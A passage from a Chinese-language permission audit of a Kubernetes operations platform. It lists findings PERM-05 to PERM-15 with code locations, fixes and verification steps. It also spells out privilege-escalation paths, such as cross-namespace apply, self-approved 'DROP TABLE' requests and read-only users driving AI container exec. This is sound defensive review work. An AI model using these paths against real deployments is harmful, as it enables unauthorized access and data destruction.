  且缺失时退化为「集群级校验」（ns=""），执行时又落到 default（pod_list_events.go:470-472）。
代码位置：
  api-server/app/api/resources.py:1002-1021（apply_workload）
  api-server/app/api/resources.py:744-767（apply_object_yaml）
  k8s-executor/internal/executor/pod_list_events.go:450-491（YAML 覆盖 namespace）
涉及函数或类：apply_workload、apply_object_yaml、_deny_cluster、Executor.ApplyWorkloadYaml
调用链：
  有 dev ns operate 的用户 → POST /workloads/apply {namespace:"dev", yaml:{metadata:{namespace:"prod"}}}
  → 鉴权 dev 通过 → executor 写入 prod
根本原因：鉴权用的 namespace 与实际生效的 namespace 有两个来源，未做一致性校验。
可能影响：
  - 跨命名空间创建/覆盖工作负载（含 Deployment → 可挂载任意 Secret/PVC、改镜像）；
  - 结合 `_CONFIG_OBJECT_KINDS` 里的 serviceaccount，可在他人 ns 造 SA/Token；
  - 覆盖 Deployment 即可拿到该 ns 所有 Pod 的重启权。
修改建议：
  1) 服务端先解析 YAML 得到 namespace，用它做鉴权，并要求与请求参数一致（不一致直接 400）；
  2) 或把 namespace 从 YAML 中剥离，统一由服务端参数注入；
  3) 禁止在 ns 为空时退化为集群级校验（写操作必须显式 ns）。
验证方法：
  用仅授权 ns=dev 的账号 apply 一份 metadata.namespace=prod 的 Deployment，
  修复前 prod 出现该对象，修复后 400/403。
是否需要立即处理：是
```

```
问题编号：PERM-05
问题名称：执行详情与回滚无归属校验：任意用户可读任意执行输出，任意 operator 可回滚任意集群
问题等级：P1
所属模块：执行/回滚
问题描述：
  GET /api/v1/executions/{plan_id} 只 `require_any_user`，按 id 直查 ExecutionLog
  （api/executions.py:37-56），不校验该 plan 关联的集群/告警是否属于调用者。
  POST /api/v1/executions/{plan_id}/rollback 只 `require_operator`，从 plan 里取
  alert.cluster_id 直接下发回滚（executions.py:66-90），无 check_cluster_permission。
  回滚有审计（101-108），但读取没有任何审计与隔离。
代码位置：
  api-server/app/api/executions.py:37-64（GET）、66-113（rollback）
涉及函数或类：get_execution、rollback_execution
调用链：
  viewer → GET /api/v1/executions/1..N（遍历）→ 拿到所有修复步骤命令与 stdout/stderr
  operator → POST /api/v1/executions/{id}/rollback → executor.rollback_plan(cluster_id,...)
根本原因：plan/execution 与「用户可见集群」之间没有关联查询；只有 alert 上有 cluster_id。
可能影响：
  - 执行输出常含镜像地址、内部域名、DB 连接串片段、异常堆栈 → 信息泄露；
  - 任意 operator 可对任意集群执行回滚（会改真实副本/镜像），破坏可用性。
修改建议：
  1) GET 里 join Alert 取 cluster_id 后 `check_cluster_permission(user, cid, ns)`；
  2) rollback 同样校验 + 要求 plan 所属项目内 operate；
  3) 读取敏感执行输出也写 audit。
验证方法：viewer 拉一个不属于自己集群的 plan 执行日志，修复前 200 有内容，修复后 403。
是否需要立即处理：是
```

```
问题编号：PERM-06
问题名称：告警/审批/统计等只读聚合接口无集群可见性过滤，viewer 可见全平台业务数据
问题等级：P1
所属模块：告警 / 审批 / 统计
问题描述：
  资源级授权只用了 42+39 处，且集中在 resources / db / terminal / monitoring / release /
  diagnosis / agent / logs。以下接口只有角色判定：
   - GET /api/v1/alerts（alerts.py:60-124）：无 visible cluster 过滤；
   - GET /api/v1/alerts/{id}、/{id}/describe（225、640）：任意告警可看，describe 还会
     实时打集群取事件；
   - POST /api/v1/alerts/{id}/resolve|assign|ack|batch-resolve（240、308、468、485）：任意 operator 可处置；
   - GET /api/v1/approvals、/approvals/{id}（approvals.py:31-95、157-174）：全平台审批单；
   - /api/v1/stats/*（stats.py 8 路由）：平台级聚合，按角色即可读。
  对比：clusters 列表做了 visible 过滤（clusters.py:753），tickets 与 trace 也做了
  （ticket_service.py:229、trace_service.py:795），说明能力存在但未推广。
代码位置：
  api-server/app/api/alerts.py:60、225、240、308、468、485、640
  api-server/app/api/approvals.py:31、157
  api-server/app/services/user_permission_service.py:24-49（未被复用的可见性函数）
涉及函数或类：list_alerts、get_alert、resolve_alert、list_approvals、get_approval
调用链：viewer → GET /alerts?status=all → 全平台告警（含 namespace/资源名/故障详情/AI 结论）
根本原因：告警是「平台级运营视角」设计的，引入项目制后未回补租户过滤。
可能影响：多租户场景下业务信息泄露（谁在出故障、哪个 namespace、什么错误）；operator 可跨租户消除告警掩盖问题。
修改建议：
  1) list/get 接口统一用 `get_visible_cluster_ids(user)` 过滤（admin 返回 None 即不过滤）；
  2) 处置类接口加 `check_cluster_permission(alert.cluster_id, alert.namespace, "operate")`；
  3) 审批列表按「审批人 ∈ approvers」或「项目成员」过滤（当前连这个都没有）。
验证方法：viewer（仅 dev 项目）调 GET /alerts?status=all，修复前含其他项目告警，修复后仅本项目。
是否需要立即处理：是
```

```
问题编号：PERM-07
问题名称：数据库审核单可自批，且建单不校验对目标库的授权
问题等级：P1
所属模块：数据库审核
问题描述：
  1) 自批：create_request 只记 `requested_by`（db_approval_service.py:109-127），
     approve 只判 `can_approve_db`（api/db_approvals.py:277-278），
     两者之间**没有** `requested_by != approved_by` 的互斥校验。
     项目 manager 提交写 SQL → 自己点通过 → execute_mode=immediate 立刻执行
     （api/db_approvals.py:292-293 → db_approval_service.execute_request）。
  2) 建单不校验库授权：`POST /db-approvals` 只 `require_operator` 且只查连接存在
     （api/db_approvals.py:152-155），没有 `check_db_permission(user, conn_id)`。
     而同一文件的 `PUT /db-connections/{id}/approval-policy` 反而有 can_approve_db 校验（67-69）。
  3) 策略默认全 false（_default_policy_dict，db_approvals.py:43-52）→ 新库默认「无需审批」。
代码位置：
  api-server/app/api/db_approvals.py:112-168（建单）、270-299（审批）
  api-server/app/services/db_approval_service.py:109-127、297-315
涉及函数或类：create_db_approval、approve_db_approval、can_approve_db、create_request
调用链：
  managerA → POST /db-approvals {conn_id:X, kind:"ddl", sql:"DROP TABLE ..."}
  → POST /db-approvals/{id}/approve {execute_mode:"immediate"} → 立即执行（db_approvals.py:277-278 仅判审批人资格）
根本原因：审核模型只有「审批人资格」，没有「申请/审批职责分离」与「申请资格」两个概念。
可能影响：DDL/DML 变更的双人复核形同虚设；operator 可对无授权的库产生审核单，形成审批噪声与社工入口。
修改建议：
  1) approve 增加 `if req.requested_by == user.username: return 403（需他人审批）`；
  2) 高风险 kind（ddl/write）强制双人（复用 approval_flow 的 manager+admin 双票）；
  3) 建单前 `check_db_permission(user, conn_id, "manage" 或 "read")`；
  4) 新库默认策略建议 need_ddl=true。
验证方法：manager 自建自批一张 ddl 单，修复前直接 executed，修复后 403。
是否需要立即处理：是
```

```
问题编号：PERM-08
问题名称：审批权与操作权完全解耦，审批人无需对目标集群有任何权限
问题等级：P2
所属模块：审批流
问题描述：
  approval_service 的审批人完全由流程节点决定（duty / group_all 含 admin / user / manager，
  approval_service.py:79-137），全程没有 check_cluster_permission。
  于是「有生产集群权限的人」与「能批生产变更的人」是两个不相交集合：
  值班人可能对目标集群零权限，却要为该集群的高危变更背书。
  另：`_expand_flow` 在 approvers 为空时回退为 `[current_user.username]`（135-136），
  而 `_check_approver_permission` 在 approvers 为空时**跳过校验直接放行**（207-211），
  即「申请人自批」在流程配置缺失时是默认行为。
代码位置：
  api-server/app/services/approval_service.py:79-137、197-225、415-475
  api-server/app/services/user_permission_service.py:121-140（resolve_project_managers，唯一与资源相关的审批人来源）
涉及函数或类：_expand_flow、_expand_dual_approvers、_check_approver_permission、approve
调用链：alert → create_approval → flow 展开 approvers → 通知 → approve(username ∈ approvers)
根本原因：审批流按「组织角色」建模，未与「资源授权」对齐（双人审批的 manager 节点是唯一例外）。
可能影响：审批失去技术背书意义；流程配置缺失时退化为自批。
修改建议：
  1) 审批人集合 = 流程节点 ∩ (对目标 cluster/ns 有 operate 的人)，为空则升级到 admin；
  2) 显式禁止 `approved_by` 与 plan 触发者/提交人相同；
  3) approvers 为空时报错阻断（不要放行）。
验证方法：构造无值班人+无 admin 的环境建审批单，观察是否可由申请人自己通过。
是否需要立即处理：否
```

```
问题编号：PERM-09
问题名称：诊断会话只要求 read 权限，但会话内 AI 可执行容器命令（read→operate 提权）
问题等级：P2
所属模块：AI 诊断助手
问题描述：
  POST /api/v1/agent/sessions 的权限校验使用默认 required：
      if not await user_permission_service.check_cluster_permission(user, cluster_id, namespace):
  （api/agent.py:133，默认 "read"），会话建立后 agent_service 把 allow_operate 硬编码为 True
  （services/agent_service.py:152-158），白名单只限工具名（exec_in_pod），不限动作语义
  （118-138）。于是「只读授权」的用户可以在容器里执行任意命令（含写文件、装包、读取
  挂载的 Secret、访问 SA token）。
代码位置：
  api-server/app/api/agent.py:133、294、349
  api-server/app/services/agent_service.py:118-160
  api-server/app/services/tool_registry.py:1299-1312
涉及函数或类：create_session、_execute_tool、AGENT_OPERATE_WHITELIST
调用链：read 用户 → 建会话（read 通过）→ deep 诊断 → LLM 决定 exec_in_pod
  → allow_operate=True → 容器内执行
根本原因：会话级权限用 read，工具级能力是 operate，两者未对齐。
可能影响：视图权限被放大为「容器内任意操作」；对共享命名空间尤其危险。
修改建议：
  1) 会话创建时按「是否需要 operate 工具」选择 required 级别；
  2) exec_in_pod 单次调用前再校验一次 operate（不能只靠会话建立时的快照）；
  3) 前端在只有 read 时隐藏「深度诊断」入口。
验证方法：只给某用户 read 授权，建深度会话让 AI 执行 `touch /tmp/x`，修复前成功。
是否需要立即处理：否
```

```
问题编号：PERM-10
问题名称：写操作审计覆盖率约 9%（25 个审计点 vs 285 个写路由），高危变更不可追溯
问题等级：P2
所属模块：审计
问题描述：
  `grep -rn "create_audit_record" app --include="*.py" | wc -l` = 25（含复用函数
  `_audit_node_change`/`_audit_sql`），而 POST/PUT/DELETE/PATCH 路由 285 个。
  完全没有审计的写模块包括：
   - clusters.py（建/改/删集群、替换 kubeconfig、签发 agent 证书、批量升级 agent）
   - permissions.py（授予/回收集群与 DB 授权）
   - projects.py（项目成员增删 —— 等于授权变更）
   - custom_tasks.py / batch.py（跨集群执行）
   - mcp.py（容器执行）
   - terminal.py（容器 exec）
   - db_approvals.py（建单/审批/驳回/下载导出结果）
   - resources.py 的 delete_workload / scale / rollout / rollback / env / mounts（仅 3 处有）
代码位置（举例）：
  api-server/app/api/clusters.py:661-925（无 audit）
  api-server/app/api/permissions.py:32-159（无 audit）
  api-server/app/api/resources.py:1137-1150（delete_workload 无 audit）
  api-server/app/api/db_approvals.py:112-330（无 audit）
涉及函数或类：各 handler；audit_service.create_audit_record
调用链：写操作 → DB/K8s 变更 → （无记录）
根本原因：审计靠每个 handler 手写一行，没有全局中间件或 ORM hook 兜底。
可能影响：事后无法回答「谁在什么时候改了哪个集群的什么」；哈希链的完整性优势被覆盖率抵消。
修改建议：
  1) 加一个「写路由自动审计中间件」：按 method + path + user + body 摘要落库（敏感字段脱敏）；
  2) 高风险 handler（删除/执行/授权）保留业务级细粒度审计；
  3) 审计写入失败要告警（当前多数是 `except: logger.warning` 静默）。
验证方法：统计「写路由数 / 审计点覆盖的写路由数」，目标 >90%。
是否需要立即处理：否
```

```
问题编号：PERM-11
问题名称：execute_tool 的权限闸门只认调用方自报的 allow_operate，不使用 user_id
问题等级：P2
所属模块：AI 工具层
问题描述：
  tool_registry.execute_tool 的写权限判定是：
      if tool["permission"] != "readonly" and not context.get("allow_operate"): 拒绝
  （tool_registry.py:1815-1823）。context 里虽然有 user_id（tool_registry.py:25 注释、
  agent_service.py:152-158 未传），但**没有任何 handler 使用 user_id 做资源校验**，
  也没有 role 参与判定。即「是否能写」由调用方（agent_service 硬编码 True）决定，
  工具层没有独立判断能力。
代码位置：
  api-server/app/services/tool_registry.py:1794-1832
  api-server/app/services/agent_service.py:141-160
  api-server/app/api/mcp.py:94-108（绕过）
涉及函数或类：execute_tool、_h_exec_in_pod 等全部 handler
调用链：agent_service._execute_tool → execute_tool → handler（无 user 上下文）
根本原因：工具注册表设计时把「授权」外置给调用方，未把 user 纳入 context 契约的强制项。
可能影响：新增任何调用方（如 MCP，已发生）都会默认拿到全量写能力；审计无法归属到人。
修改建议：
  1) context 必填 `user`（对象）与 `required_permission`，execute_tool 内统一校验；
  2) handler 不直接调 executor_client，统一走带授权的执行门面；
  3) 每次工具调用写 audit（含 user_id/session_id）。
验证方法：给 execute_tool 传空 user 应拒绝；MCP 与 agent 两条路径都应拦住。
是否需要立即处理：否
```

```
问题编号：PERM-12
问题名称：审批 approvers 为空时既放行校验又回退为申请人自批
问题等级：P2
所属模块：审批流
问题描述：
  两处「空集合」处理叠加成自批通道：
   1) _expand_flow 末尾：`if not approvers and current_user: approvers = [current_user.username]`
      （approval_service.py:135-136）→ 无值班人/无 admin/无指定人时，**申请人成为审批人**；
   2) _check_approver_permission：`if not approvers: return None`（放行，仅 warning）
      （approval_service.py:207-211）→ 历史数据/异常数据的单据**任何人可批**。
  默认流程节点是 duty → group_all(include_admin=True)（models/approval_flow.py:55-58），
  正常有 admin 时不会触发；但「值班人缺失 + on_empty=next + 无 admin 账号」即可命中 1)。
代码位置：
  api-server/app/services/approval_service.py:79-137、197-225
  api-server/app/models/approval_flow.py:55-58
涉及函数或类：_expand_flow、_check_approver_permission
调用链：create_approval → _expand_flow → approvers=[current_user] → 同人调用 /decide
根本原因：为兼容「旧数据/流程缺配」做了宽松兜底，未区分「历史兼容」与「新建单据」。
可能影响：流程配置异常时审批可被自批/任意人批，且无告警提示。
修改建议：
  1) 新建单据时 approvers 为空直接抛错（配置问题应在创建阶段暴露）；
  2) 旧数据放行时写审计 + 高亮告警，并给一次性修复脚本；
  3) 强制 `approved_by ∩ {requester}` 为空。
验证方法：删掉所有 admin 与值班人后建单，观察 approvers 是否为申请人本人。
是否需要立即处理：否
```

```
问题编号：PERM-13
问题名称：内部服务 token 复用 JWT_SECRET_KEY，服务身份与用户身份同源
问题等级：P2
所属模块：服务间鉴权
问题描述：
  X-Internal-Token 直接等于用户 JWT 的签名密钥：
   ai_proxy.py:23、ai_client.py:28、alerts.py:539,553、ai-service/app/main.py:46，
   Go 侧 internal/config/config.go 同样取 JWT_SECRET_KEY。
  于是「拿到内部 token 的组件」可同时伪造任意用户身份的 JWT；
  反之「泄露的 JWT 密钥」可调用 /alerts/{id}/auto-process 触发自动诊断修复链。
  另外 ai-service 的 CORS 是 allow_origins=["*"] 且 allow_credentials=True
  （ai-service/app/main.py:59-64），浏览器侧组合不合法但配置意图过宽。
代码位置：
  api-server/app/api/ai_proxy.py:23
  api-server/app/clients/ai_client.py:28
  api-server/app/api/alerts.py:536-545、547-560
  ai-service/app/main.py:37-48、59-64
涉及函数或类：_internal_headers、internal_auth_middleware、auto_process_alert
调用链：持有 JWT_SECRET_KEY 者 → POST /alerts/1/auto-process（X-Internal-Token）
  → process_alert → AI 诊断 + 自动修复
根本原因：为省一个配置项而复用密钥，两个信任域合并。
可能影响：密钥泄露的影响面从「会话伪造」扩大到「内部接口全量调用」。
修改建议：
  1) 独立 INTERNAL_API_TOKEN（可轮换，按服务分权）；
  2) ai-service CORS 收敛为显式白名单或去掉；
  3) 内部接口加来源校验（NetworkPolicy / mTLS）。
验证方法：用 JWT_SECRET_KEY 调 ai-service 应 401（改后）；用旧 token 误配应 401。
是否需要立即处理：否
```

```
问题编号：PERM-14
问题名称：若干小接口缺少归属校验（DB 连接测试、项目成员可见、静默删除）
问题等级：P3
所属模块：数据库 / 项目 / 告警
问题描述：
  1) GET /api/v1/db-connections/{id}/test（db_connections.py:1613-1622）require_any_user，
     不校验 check_db_permission → 任何登录用户可让平台用保存的凭据连库（探测/凭据滥用）；
  2) GET /projects/{id}/users、/projects/{id}/cluster-ns（projects.py:232-243、123+）require_any_user，
     不校验成员身份 → 全局用户列表与项目→集群映射可枚举；
  3) DELETE /alert-silences/{id}、/inhibitions/{id}（alert_silences.py:114,291）require_operator，
     不校验 cluster 归属 → 可删他人集群的静默规则（影响告警抑制，隐蔽）。
代码位置：
  api-server/app/api/db_connections.py:1613-1622
  api-server/app/api/projects.py:123-140、232-243
  api-server/app/api/alert_silences.py:114、291
涉及函数或类：test_connection、list_project_users、delete_silence
调用链：任意登录用户 → 上述接口
根本原因：局部接口未纳入统一守卫，属漏接而非设计。
可能影响：信息枚举、凭据被用于非授权连接测试、告警抑制被他人解除。
修改建议：分别补 check_db_permission / 项目成员校验 / check_cluster_permission。
验证方法：viewer 调 /db-connections/1/test 应 403。
是否需要立即处理：否
```

```
问题编号：PERM-15
问题名称：proactive/scan 与 auto-process 的内部令牌比较、以及 operator 触发全平台扫描
问题等级：P3
所属模块：巡检 / 内部接口
问题描述：
  1) POST /agent/proactive/scan（agent.py:505-524）require_operator，但 run_scan 不传用户可见
     集群（只传 user_id 用于落库）→ operator 可触发全平台巡检（AI 成本、全平台数据进入会话）；
  2) `token != settings.JWT_SECRET_KEY`（alerts.py:539、553；ai-service/main.py:47）是**非恒时比较**，
     理论上有计时侧信道（实际可利用性极低，但要与 hmac.compare_digest 统一）；
  3) 全仓 webhook 验签已正确使用 hmac.compare_digest（webhooks.py:62,72,81），可作参照。
代码位置：
  api-server/app/api/agent.py:505-524
  api-server/app/api/alerts.py:539、553
  ai-service/app/main.py:47
涉及函数或类：proactive_scan、auto_process_alert
调用链：operator → /agent/proactive/scan → pds.run_scan（全平台）
根本原因：内部接口按「可信内网」写死，未统一安全原语。
可能影响：低；主要是成本与口径问题。
修改建议：scan 限定 visible clusters；内部 token 比较统一用 secrets.compare_digest。
验证方法：operator 触发 scan 观察是否扫描了无授权集群。
是否需要立即处理：否
```

---

## 7. 无法确认事项

| 事项 | 卡点 |
|---|---|
| `viewer` 角色在生产是否真实分配 | 只读源码；用户数据在外部 MySQL，未连接 |
| `developer` 角色的实际用途 | 只在 `require_any_user` 里出现（`middleware/permission.py:25`），全仓无专属依赖，疑似预留 |
| 生产是否配置了「值班人」 | 在 `system_settings`/on_duty 表，未读库 |
| `/mcp` 在生产是否被外部暴露（反代/端口映射） | 仓库内 nginx/Ingress 均不转发 `/mcp`；实际网关（SamWaf 等）配置不在仓库 |
| 各 agent 集群实际授予的 ClusterRole 是否仍是 `*/*` | 模板见 `clusters.py:441-467`（ARCH-13），集群内实际对象需 `kubectl auth can-i` 验证 |
| `import/import-sql/import-chunk` 是否应走 `need_write` 审批 | 代码未调 `_check_approval`；是否有其它入口（前端 428 流程）兜底无法从后端代码确认 |
| `custom_tasks` 是否在生产被使用 | 需查表；代码路径完整 |

---

## 8. 审计方法与覆盖范围

**精读（全文）**
- `app/middleware/auth.py`（54 行）、`app/middleware/permission.py`（25 行）
- `app/api/permissions.py`（162）、`projects.py`（348）、`service_accounts.py`（31）、
  `external_access.py`（76）、`mcp.py`（125）、`agent.py`（618）、`terminal.py`（134）、
  `executions.py`（114）、`approvals.py`（194）、`db_approvals.py`（336）、`batch.py`（50）、
  `custom_tasks.py`（约 100）、`auth.py`（170）
- `app/services/user_permission_service.py`（160）、`host_group_service.py`（关键段）、
  `db_approval_service.py`（关键段 109-400）、`approval_service.py`（79-230、415-480）、
  `autonomy_gate.py`（1-110）、`command_guard.py`（148）、`tool_registry.py`（关键段 1-160、1290-1832）、
  `agent_service.py`（118-360）、`batch_service.py`（42-100）、`scheduler_service.py`（60-110）、
  `audit_service.py`（1-60）、`rbac_service.py`（引用点）
- `app/models/permission.py`、`models/project.py`、`models/approval_flow.py`
- `api/resources.py`（1-120、744-830、1002-1150、1280-1500、1860-2110、2420-2850 定向精读）
- `api/db_connections.py`（337-450、672-830、1300-1400、1610-1650 定向精读）
- `api/alerts.py`（55-125、225-330、528-560）、`api/host_terminal.py`（124-330、412-560）
- `k8s-executor/internal/grpc/server.go`（40-240、647-680）、`cmd/executor/main.go`（88-115）、
  `internal/executor/execute.go`（85-240）、`pod_list_events.go`（450-520）、`internal/script/runner.go`、
  `internal/agentbridge/bridge.go`（160-210）、`internal/logstream/server.go`（1-110）
- `k8s/networkpolicy.yaml`、`k8s/ingress.yaml`、`k8s/services.yaml`

**扫描式（grep + 定点）**
- 全部 66 个 `app/api/*.py` 的 `@router.` 与 `Depends(require_*)`（脚本枚举 499 路由）
- `check_cluster_permission` / `check_db_permission` / `get_visible_cluster_ids` / `UserClusterPermission` /
  `UserDBConnection` / `UserProjectPermission` 全仓引用点
- `create_audit_record` 全仓 25 个调用点
- `execute_plan|execute_command|delete_resource|scale_workload|apply_pod_yaml` 直接调用点
- 无依赖路由扫描（脚本），逐个复核 `screens.py`、`stats.py`、`workload_logs.py` 的 query token 鉴权

**未读**：`api/release.py` 全文（只看了 3 处 cluster 校验）、`api/stats.py` 业务聚合细节、
`api/inspections.py` 全文、`rbac_service` 的 K8s RoleBinding 渲染细节、前端 69 个页面的按钮级权限渲染。

**未执行的操作（合规说明）**：未修改任何业务文件（仅新建本报告）、未安装依赖、未连接任何环境、
未执行 git 写操作（只用了 `git ls-files` / `git status` 只读查询）。
